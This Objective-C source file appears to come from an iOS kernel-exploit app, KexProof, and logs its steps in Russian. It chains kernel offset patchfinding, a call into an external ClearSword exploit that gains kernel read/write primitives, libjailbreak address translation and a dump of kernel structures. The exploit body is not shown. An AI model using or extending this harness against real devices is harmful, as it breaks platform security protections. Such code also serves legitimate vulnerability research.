#import "KPRunner.h"
#import "KPLog.h"
#import "KPDump.h"

#import <UIKit/UIKit.h>
#import <pthread.h>
#import <string.h>
#import <sys/utsname.h>
#import <unistd.h>
#import <xpc/xpc.h>

#import <libjailbreak/info.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/translation.h>

#import "xpf.h"

// ClearSword entry point (Sources/exploit/ClearSword.m)
extern int exploit_init(const char *flavor);

#pragma mark - stdout/stderr capture

// The exploit logs with fprintf(stderr, ...). We redirect both fds into a
// pipe for the duration of the run and forward lines into KPLog so the
// exploit's own progress shows up in the UI and in the report.

static int gOrigStdout = -1;
static int gOrigStderr = -1;
static int gPipeFds[2] = { -1, -1 };
static pthread_t gReaderThread;
static BOOL gCapturing = NO;

static void *kpReaderMain(void *arg)
{
    NSMutableData *pending = [NSMutableData data];
    uint8_t buf[2048];
    for (;;) {
        ssize_t n = read(gPipeFds[0], buf, sizeof(buf));
        if (n <= 0) break;
        [pending appendBytes:buf length:(NSUInteger)n];
        // Forward complete lines; keep the tail for the next round.
        NSUInteger start = 0;
        const uint8_t *bytes = pending.bytes;
        for (NSUInteger i = 0; i < pending.length; i++) {
            if (bytes[i] == '\n') {
                NSData *chunk = [pending subdataWithRange:NSMakeRange(start, i - start)];
                NSString *line = [[NSString alloc] initWithData:chunk encoding:NSUTF8StringEncoding];
                if (!line) line = [[NSString alloc] initWithData:chunk encoding:NSISOLatin1StringEncoding];
                if (line.length) {
                    // 1.2.4: drop NSLog's own stderr echo ("... KexProof[pid:tid] [KexProof] ...").
                    // The unified-log mirror in KPLog also writes to stderr;
                    // appending that echo recurses forever and floods the log.
                    if ([line rangeOfString:@"KexProof["].location == NSNotFound) {
                        [[KPLog shared] append:line];
                    }
                }
                start = i + 1;
            }
        }
        if (start > 0) {
            [pending replaceBytesInRange:NSMakeRange(0, start) withBytes:NULL length:0];
        }
    }
    if (pending.length) {
        NSString *line = [[NSString alloc] initWithData:pending encoding:NSUTF8StringEncoding];
        if (line.length) [[KPLog shared] append:line];
    }
    return NULL;
}

static void kpStartCapture(void)
{
    if (gCapturing) return;
    if (pipe(gPipeFds) != 0) return;
    fflush(stdout);
    fflush(stderr);
    gOrigStdout = dup(STDOUT_FILENO);
    gOrigStderr = dup(STDERR_FILENO);
    dup2(gPipeFds[1], STDOUT_FILENO);
    dup2(gPipeFds[1], STDERR_FILENO);
    if (pthread_create(&gReaderThread, NULL, kpReaderMain, NULL) != 0) {
        dup2(gOrigStdout, STDOUT_FILENO);
        dup2(gOrigStderr, STDERR_FILENO);
        close(gOrigStdout);
        close(gOrigStderr);
        close(gPipeFds[0]);
        close(gPipeFds[1]);
        gPipeFds[0] = gPipeFds[1] = -1;
        return;
    }
    gCapturing = YES;
}

static void kpStopCapture(void)
{
    if (!gCapturing) return;
    fflush(stdout);
    fflush(stderr);
    dup2(gOrigStdout, STDOUT_FILENO);
    dup2(gOrigStderr, STDERR_FILENO);
    close(gOrigStdout);
    close(gOrigStderr);
    close(gPipeFds[1]); // EOF for the reader
    pthread_join(gReaderThread, NULL);
    close(gPipeFds[0]);
    gPipeFds[0] = gPipeFds[1] = -1;
    gCapturing = NO;
}

void KPForwardToOriginalStderr(NSString *line)
{
    int fd = gOrigStderr >= 0 ? gOrigStderr : STDERR_FILENO;
    const char *text = line ? line.UTF8String : "";
    dprintf(fd, "%s\n", text);
}

#pragma mark - Path resolution

static NSString *kpFirstReadable(NSArray<NSString *> *candidates)
{
    for (NSString *path in candidates) {
        if (access(path.fileSystemRepresentation, R_OK) == 0) return path;
    }
    return nil;
}

static NSString *kpResolveKernelcachePath(void)
{
    NSString *bundle = NSBundle.mainBundle.bundlePath;
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    return kpFirstReadable(@[
        @"/System/Library/Caches/com.apple.kernelcaches/kernelcache",
        [bundle stringByAppendingPathComponent:@"kernelcache"],
        [docs stringByAppendingPathComponent:@"kernelcache"],
    ]);
}

static NSString *kpResolveSPTMPath(void)
{
    NSString *bundle = NSBundle.mainBundle.bundlePath;
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    return kpFirstReadable(@[
        [bundle stringByAppendingPathComponent:@"sptm.img4"],
        [docs stringByAppendingPathComponent:@"sptm.img4"],
        [docs stringByAppendingPathComponent:@"sptm.im4p"],
        @"/usr/standalone/firmware/FUD/Ap,SecurePageTableMonitor.img4",
    ]);
}

static NSString *kpResolveTXMPath(void)
{
    NSString *bundle = NSBundle.mainBundle.bundlePath;
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    return kpFirstReadable(@[
        [bundle stringByAppendingPathComponent:@"txm.img4"],
        [docs stringByAppendingPathComponent:@"txm.img4"],
        [docs stringByAppendingPathComponent:@"txm.im4p"],
        @"/usr/standalone/firmware/FUD/Ap,TrustedExecutionMonitor.img4",
    ]);
}

#pragma mark - XPF

static xpc_object_t kpConstructOffsetDictionary(void)
{
    const char *sets[] = { "translation", "trustcache", "physmap", "struct", "physrw", "IOSurface", "sandbox", NULL };
    xpc_object_t full = xpf_construct_offset_dictionary(sets);
    if (full) return full;

    [[KPLog shared] appendFormat:@"Полный словарь оффсетов не собрался (%s) — собираю по одному сету",
        xpf_get_error() ? xpf_get_error() : "нет ошибки"];

    xpc_object_t merged = xpc_dictionary_create_empty();
    for (int i = 0; sets[i]; i++) {
        const char *single[] = { sets[i], NULL };
        xpc_object_t one = xpf_construct_offset_dictionary(single);
        if (one) {
            xpc_dictionary_apply(one, ^bool(const char *key, xpc_object_t value) {
                xpc_dictionary_set_value(merged, key, value);
                return true;
            });
            // ARC manages the xpc dictionary; xpc_release is unavailable here.
        }
        else {
            [[KPLog shared] appendFormat:@"  сет \"%s\" не удался: %s — пропускаю",
                sets[i], xpf_get_error() ? xpf_get_error() : "нет ошибки"];
        }
    }
    return merged;
}

#pragma mark - Runner

@implementation KPRunner

static BOOL sHasKRW = NO;

+ (BOOL)hasKRW
{
    return sHasKRW;
}

+ (void)runInBackgroundWithCompletion:(void (^)(BOOL, NSString *))completion
{
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        BOOL ok = NO;
        NSString *reportPath = nil;
        @try {
            ok = [self _run:&reportPath];
        }
        @catch (NSException *exception) {
            [[KPLog shared] appendFormat:@"Исключение: %@ — %@", exception.name, exception.reason];
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(ok, reportPath);
        });
    });
}

+ (BOOL)_run:(NSString **)reportPathOut
{
    KPLog *log = [KPLog shared];

    struct utsname u;
    uname(&u);
    [log appendFormat:@"=== KexProof 1.5.4 — %s, Darwin %s ===", u.machine, u.release];
    [log appendFormat:@"iOS %@", [UIDevice currentDevice].systemVersion];

    // ---------- Stage 1: patchfinding ----------
    [log append:@"\n[Этап 1/4] Патчфайндинг (XPF)"];

    NSString *kernelPath = kpResolveKernelcachePath();
    if (!kernelPath) {
        [log append:@"kernelcache недоступен из песочницы. Положите kernelcache в bundle или в Documents — выход."];
        return NO;
    }
    [log appendFormat:@"kernelcache: %@", kernelPath];

    NSString *sptmPath = kpResolveSPTMPath();
    NSString *txmPath = kpResolveTXMPath();
    [log appendFormat:@"sptm: %@", sptmPath ? sptmPath : @"не найден (SPTM-символы будут пропущены)"];
    [log appendFormat:@"txm: %@", txmPath ? txmPath : @"не найден (TXM-символы будут пропущены)"];
    if (!sptmPath) {
        [log append:@"ВНИМАНИЕ: без sptm.img4 на SPTM-устройстве патчфайндинг, скорее всего, не найдёт physmap/translation-сеты."];
    }

    int xr = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation,
                                        sptmPath ? sptmPath.fileSystemRepresentation : NULL,
                                        txmPath ? txmPath.fileSystemRepresentation : NULL);
    if (xr != 0) {
        [log appendFormat:@"xpf_start_with_kernel_path failed: %s", xpf_get_error() ? xpf_get_error() : "?"];
        xpf_stop();
        return NO;
    }
    [log appendFormat:@"XPF: kernel загружен, base=%#llx darwin=%s sptm=%s txm=%s",
        gXPF.kernelBase, gXPF.darwinVersion ? gXPF.darwinVersion : "?",
        gXPF.sptm ? "да" : "нет", gXPF.txm ? "да" : "нет"];

    xpc_object_t offsetDict = kpConstructOffsetDictionary();
    if (!offsetDict) {
        [log appendFormat:@"xpf_construct_offset_dictionary failed: %s", xpf_get_error() ? xpf_get_error() : "?"];
        xpf_stop();
        return NO;
    }

    xpc_dictionary_set_uint64(offsetDict, "kernelConstant.staticBase", gXPF.kernelBase);
    if (gXPF.sptm) {
        xpc_dictionary_set_uint64(offsetDict, "kernelConstant.staticSptmBase", gXPF.sptmBase);
    }
    if (gXPF.txm) {
        xpc_dictionary_set_uint64(offsetDict, "kernelConstant.staticTxmBase", gXPF.txmBase);
    }

    [log append:@"Словарь оффсетов XPF:"];
    xpc_dictionary_apply(offsetDict, ^bool(const char *key, xpc_object_t value) {
        if (xpc_get_type(value) == XPC_TYPE_UINT64) {
            [[KPLog shared] appendFormat:@"  0x%016llx <- %s", xpc_uint64_get_value(value), key];
        }
        return true;
    });

    jbinfo_initialize_dynamic_offsets(offsetDict);
    jbinfo_initialize_hardcoded_offsets();
    [log append:@"gSystemInfo заполнена (динамические + жёстко заданные оффсеты)"];
    // ARC owns offsetDict; explicit xpc_release is forbidden under ARC.
    xpf_stop();

    // ---------- Stage 2: exploit ----------
    if (!sHasKRW) {
        [log append:@"\n[Этап 2/4] Эксплойт ClearSword (может занять несколько минут)"];
        kpStartCapture();
        int er = exploit_init(NULL);
        kpStopCapture();

        if (er != 0 || !gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
            [log appendFormat:@"Эксплойт НЕ удался (код %d). Можно повторить — кнопка снова активна.", er];
            return NO;
        }
        sHasKRW = YES;
        [log appendFormat:@"Эксплойт УСПЕШЕН. kernel slide = %#llx, kernel base = %#llx",
            gSystemInfo.kernelConstant.slide, kconstant(staticBase) + gSystemInfo.kernelConstant.slide];
        [log appendFormat:@"kreadbuf=%p kwritebuf=%p minSafeRead=0x%x",
            gPrimitives.kreadbuf, gPrimitives.kwritebuf, gPrimitives.krwMinSafeReadSize];
    }
    else {
        [log append:@"\n[Этап 2/4] KRW-примитивы уже активны — повторный дамп без эксплойта"];
    }

    // ---------- Stage 3: boot constants + translation ----------
    [log append:@"\n[Этап 3/4] Константы загрузки и трансляция адресов"];
    kpStartCapture();
    // translation first: it only installs the vtophys/phystokv helpers (needs
    // ARM_TT_L1_INDEX_MASK from the dict), after which the boot-constants
    // reads below can be probed through the page tables.
    libjailbreak_translation_init();
    [KPDump initializeBootConstantsGuarded];
    kpStopCapture();

    // ---------- Stage 4: dump ----------
    [log append:@"\n[Этап 4/4] Дамп структур ядра"];
    kpStartCapture();
    NSString *report = [KPDump buildReport];
    kpStopCapture();

    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *path = [docs stringByAppendingPathComponent:@"kexproof-dump.txt"];
    NSString *fullReport = [report stringByAppendingFormat:@"\n\n--- Полный журнал ---\n%@", [KPLog shared].transcript];

    NSError *writeError = nil;
    if (![fullReport writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:&writeError]) {
        [log appendFormat:@"Не удалось записать отчёт: %@", writeError];
        return NO;
    }

    [log appendFormat:@"Отчёт записан: %@", path];
    if (reportPathOut) *reportPathOut = path;
    return YES;
}

@end
